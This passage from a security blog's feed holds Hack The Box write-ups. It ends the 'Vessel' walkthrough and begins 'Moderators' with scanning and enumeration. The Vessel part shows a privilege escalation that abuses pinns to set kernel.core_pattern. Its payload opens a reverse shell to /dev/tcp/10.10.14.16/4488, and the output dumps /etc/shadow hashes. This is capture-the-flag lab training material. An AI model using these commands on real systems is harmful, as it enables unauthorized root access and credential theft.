<span id="cb38-22"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">ERRO</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0000</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">runc</span> run failed: rootless container requires user namespaces</span></code></pre></div>
<p>Reading about this I find a <a href="https://github.com/opencontainers/runc/issues/1782">GitHub Issue</a> stating that generating the default spec using <code>run spec --rootless</code> will solve the problem, so remove everything and try again.</p>
<div class="sourceCode" id="cb39" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb39-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> rm <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-rf</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb39-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> runc spec <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--rootless</span></span>
<span id="cb39-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> mkdir rootfs</span>
<span id="cb39-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> vim config.json </span>
<span id="cb39-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> runc run privesc</span>
<span id="cb39-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># hostname</span></span>
<span id="cb39-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">runc</span></span></code></pre></div>
<p>Great, we got a container! <strong>(2)</strong> Open a second terminal and write a simple PoC script to be executed</p>
<div class="sourceCode" id="cb40" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb40-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp$</span> cat poc </span>
<span id="cb40-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/bin/sh</span></span>
<span id="cb40-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">whoami</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span> /tmp/out</span>
<span id="cb40-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span> /tmp/out</span></code></pre></div>
<p>From the second terminal run the malicious <code>pinns</code> command, I found this great <a href="https://www.wangan.com/p/7fy7f3b1e4c81b1f">Chinese post</a> showcasing this.</p>
<div class="sourceCode" id="cb41" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb41-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp$</span> /usr/bin/pinns <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> /tmp/pthree <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> privesc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/poc #'</span>--ipc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--net</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--uts</span></span></code></pre></div>
<p>We can verify that <code>netns</code> and <code>utsns</code> are created in <code>/tmp/pthree</code> from the container:</p>
<div class="sourceCode" id="cb42" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># ls -al /tmp/pthree</span></span>
<span id="cb42-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 24</span>
<span id="cb42-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span>  5 root   root    4096 Sep  2 09:07 .</span>
<span id="cb42-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span> 17 nobody nogroup 4096 Sep  2 09:03 ..</span>
<span id="cb42-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span>  1 root   root    2893 Sep  2 08:59 config.json</span>
<span id="cb42-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  2 nobody root    4096 Sep  2 09:07 netns</span>
<span id="cb42-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span>  2 root   root    4096 Sep  2 08:58 rootfs</span>
<span id="cb42-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  2 nobody root    4096 Sep  2 09:07 utsns</span></code></pre></div>
<p><strong>(3)</strong> In the first terminal (runc container) trigger a core dump to run the script.</p>
<div class="sourceCode" id="cb43" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb43-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@runc:/#</span> ulimit <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> unlimited</span>
<span id="cb43-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@runc:/#</span> tail <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> /dev/null <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span></span>
<span id="cb43-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[1]</span> 32</span>
<span id="cb43-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@runc:/#</span> kill <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-SIGSEGV</span> 32</span>
<span id="cb43-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@runc:/#</span> ps</span>
<span id="cb43-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PID</span> TTY          TIME CMD</span>
<span id="cb43-7">      <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> pts/0    00:00:00 sh</span>
<span id="cb43-8">     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">18</span> pts/0    00:00:00 bash</span>
<span id="cb43-9">     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">33</span> pts/0    00:00:00 ps</span>
<span id="cb43-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[1]+</span>  Segmentation fault      <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">core</span> dumped<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tail</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> /dev/null</span></code></pre></div>
<p>Reap the rewards from the script:</p>
<div class="sourceCode" id="cb44" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb44-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> cat /tmp/out </span>
<span id="cb44-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span></span>
<span id="cb44-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vessel</span></span></code></pre></div>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>The PoC works as intended, weaponize to gain a root shell however you like. Myself, I’d like to try the payload posted in the <a href="https://www.wangan.com/p/7fy7f3b1e4c81b1f">Chinese post</a>.</p>
<div class="sourceCode" id="cb45" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb45-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan@vessel:/tmp/pthree$</span> /usr/bin/pinns <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> /tmp/pthree <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> privesc1337 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'kernel.shm_rmid_forced=1+kernel.core_pattern=|/bin/bash -c "$@" -- eval /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.16/4488 0&gt;&amp;1 #'</span>--ipc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--net</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--uts</span></span>
<span id="cb45-2"></span>
<span id="cb45-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@runc:/#</span> ulimit <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> unlimited</span>
<span id="cb45-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@runc:/#</span> tail <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> /dev/null <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span></span>
<span id="cb45-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[1]</span> 34</span>
<span id="cb45-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@runc:/#</span> kill <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-SIGSEGV</span> 34</span>
<span id="cb45-7"></span>
<span id="cb45-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb45-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb45-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.16</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.178]</span> 49816</span>
<span id="cb45-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@vessel:/#</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span></span>
<span id="cb45-12"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb45-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">vessel</span></span>
<span id="cb45-14"></span>
<span id="cb45-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@vessel:/#</span> cat /root/root.txt</span>
<span id="cb45-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">86dad527504c8042c21914394acb7115</span></span>
<span id="cb45-17"></span>
<span id="cb45-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@vessel:/#</span> cat /etc/shadow</span>
<span id="cb45-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$9</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">AU197eAAajcv6DO</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$YOGX5f111bLxtIqVgPKGg3QmWiWIRVmYk3Gkj0BwFVb9K0BkAnJEHaRJElahiQGxtDnvjPI9XqPMkI7YrE60A1</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:19101:0:99999:7:::</span></span>
<span id="cb45-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ethan:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$7</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ZmNCkavGVnqDtRI</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$DXwHR</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.p1AXlIwDsoi20wpd57ZQL4doguuNxh4XY.vzX8wwnD8uz5Gz2AG6tWDEDfsO8CQFOYgEHg/riNHOJ4k0:19099:0:99999:7:::</span></span>
<span id="cb45-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">steven:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$Czg9</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.c1hcgYo7ON4</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ogez7L7bCGFTURA4LcPv8A5CWdGufpkI4QHhSfKtZUMq2vzT7hKP</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/.DSDRXSQBWzgvVTnIpY/jG.zYFIgWFXD.:19099:0:99999:7:::</span></span></code></pre></div>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>nodejs</category>
  <category>sqli</category>
  <category>openwebanalytics</category>
  <category>python</category>
  <category>pyinstxtractor</category>
  <category>uncompyle6</category>
  <category>runc</category>
  <guid>https://exploit.se/posts/2022-09-02-htb-writeup-vessel/2022-09-02-htb-writeup-vessel.html</guid>
  <pubDate>Fri, 02 Sep 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Moderators - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-09-05-htb-writeup-moderators/2022-09-05-htb-writeup-moderators.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.173</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-5"></span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.173</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http    Apache httpd 2.4.41 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">))</span></span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Apache/2.4.41 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Moderators</span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://10.10.11.173</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://10.10.11.173</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.2s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb2-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Google</span> Font API,  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Font</span> scripts<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Font</span> Awesome,  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Font</span> scripts<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bootstrap,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UI</span> frameworks<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache,</span> 2.4.41 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Operating</span> systems<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://moderators.htb/FUZZ          </span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.htaccess</span>               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 35ms]</span>
<span id="cb3-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.htpasswd</span>               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 38ms]</span>
<span id="cb3-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">css</span>                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 30ms]</span>
<span id="cb3-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">images</span>                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 35ms]</span>
<span id="cb3-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">logs</span>                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 32ms]</span>
<span id="cb3-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server-status</span>           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 39ms]</span>
<span id="cb3-8"></span>
<span id="cb3-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://moderators.htb/logs/FUZZ</span>
<span id="cb3-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">css</span>                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 61ms]</span>
<span id="cb3-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uploads</span>                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 47ms]</span></code></pre></div>
<p>On port 80 we’re met with a very basic and ugly php page for the company <em>Moderators</em>.</p>
<p><img src="https://exploit.se/posts/2022-09-05-htb-writeup-moderators/images/moderators01.png" class="img-fluid"></p>
<p>Looking around we find..</p>
<p>.. three names and numbers in the footer - <em>Jane</em>, <em>Holy</em> and <em>Fred</em> .. on <code>/about.php</code> we find 6 users - <em>Carl Benjamin</em>, <em>David Wall</em>, <em>Luna Harper</em>, <em>John Miller</em>, <em>Anthony Smith</em> and <em>Lexi Marie</em>. .. <code>blog.php</code> contain vulnerability reports, mostly regarding sql injections. .. <code>/reports.php?report=8121</code> contain a masked domain hinting that <code>moderators.htb</code> might have a subdomain. .. <code>/reports.php?report=4221</code> nothing of use .. <code>/reports.php?report=3478</code> nothing of use</p>
<p>Use Burp Intruder to loop through 1-10000 on <code>/reports.php?report=</code> and we find three new <em>pending</em> reports: - <code>/reports.php?report=2589</code> nothing of use - <code>/reports.php?report=7612</code> nothing of use - <code>/reports.php?report=9798</code> a path to logs - <code>logs/e21cece511f43a5cb18d4932429915ed/</code></p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  moderators curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://moderators.htb/logs/e21cece511f43a5cb18d4932429915ed/</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span>   Trying 10.10.11.173:80...</span>
<span id="cb4-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Connected to moderators.htb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">port</span> 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#0)</span></span>
<span id="cb4-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/logs/e21cece511f43a5cb18d4932429915ed/</span> HTTP/1.1</span>
<span id="cb4-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">moderators.htb</span></span>
<span id="cb4-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> User-Agent: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl/7.84.0</span></span>
<span id="cb4-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Accept: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*/*</span></span>
<span id="cb4-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb4-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*</span> Mark bundle as not supporting multiuse</span>
<span id="cb4-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb4-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Date: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fri,</span> 02 Sep 2022 11:54:32 GMT</span>
<span id="cb4-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> Server: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache/2.4.41</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
